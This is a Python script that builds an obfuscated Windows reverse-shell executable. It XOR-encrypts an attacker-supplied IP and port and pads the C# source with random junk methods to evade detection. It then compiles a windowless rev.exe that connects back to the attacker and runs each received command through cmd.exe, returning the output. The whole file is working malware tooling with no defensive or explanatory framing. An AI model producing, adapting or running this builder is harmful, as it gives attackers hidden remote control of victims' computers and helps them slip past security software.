import sys
import argparse
import subprocess
import random
import string

def generate_key(length=16):
    return [random.randint(1, 255) for _ in range(length)]

def xor_data(data, key):
    return [b ^ key[i % len(key)] for i, b in enumerate(data.encode())]

def generate_junk_code():
    junk = ""
    for _ in range(5):
        name = ''.join(random.choices(string.ascii_letters, k=10))
        junk += f"public static void {name}() {{ int x = {random.randint(1, 100)}; int y = {random.randint(1, 100)}; int z = x + y; }}\n"
    return junk

def generate_loader(ip, port, key):
    config = f"{ip}:{port}"
    encrypted = xor_data(config, key)
    
    template = f'''
using System;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;
using System.Text;

public class Loader {{
    {generate_junk_code()}
    public static void Main() {{
        byte[] key = {{ {', '.join(map(str, key))} }};
        byte[] encrypted = {{ {', '.join(map(str, encrypted))} }};
        byte[] decrypted = new byte[encrypted.Length];
        for(int i = 0; i < encrypted.Length; i++) decrypted[i] = (byte)(encrypted[i] ^ key[i % key.Length]);
        
        string[] parts = Encoding.ASCII.GetString(decrypted).Split(':');
        using (TcpClient c = new TcpClient(parts[0], int.Parse(parts[1]))) {{
            using (Stream s = c.GetStream()) {{
                StreamReader r = new StreamReader(s);
                while (true) {{
                    string cmd = r.ReadLine();
                    Process p = new Process();
                    p.StartInfo.FileName = "cmd.exe";
                    p.StartInfo.Arguments = "/c " + cmd;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.RedirectStandardOutput = true;
                    p.Start();
                    byte[] b = Encoding.ASCII.GetBytes(p.StandardOutput.ReadToEnd());
                    s.Write(b, 0, b.Length);
                }}
            }}
        }}
    }}
}}
'''
    with open("payload.cs", "w") as f: f.write(template)
    subprocess.run(["C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe", "/target:winexe", "/out:rev.exe", "payload.cs"])

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--ip", required=True)
    parser.add_argument("-p", "--port", required=True)
    args = parser.parse_args()
    generate_loader(args.ip, args.port, generate_key())
